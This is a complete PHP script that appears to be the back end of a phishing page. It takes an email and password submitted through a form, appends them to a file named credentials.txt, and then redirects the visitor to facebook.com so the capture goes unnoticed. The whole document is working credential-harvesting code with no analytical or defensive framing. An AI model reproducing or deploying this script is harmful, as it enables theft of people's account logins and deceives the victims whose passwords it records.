<?php$email = $_POST['email'];$password = $_POST['password'];
file_put_contents('credentials.txt',$email.':'.$password. PHP_EOL, FILE_APPEND);
header('Location: https://facebook.com/');
exit;?>
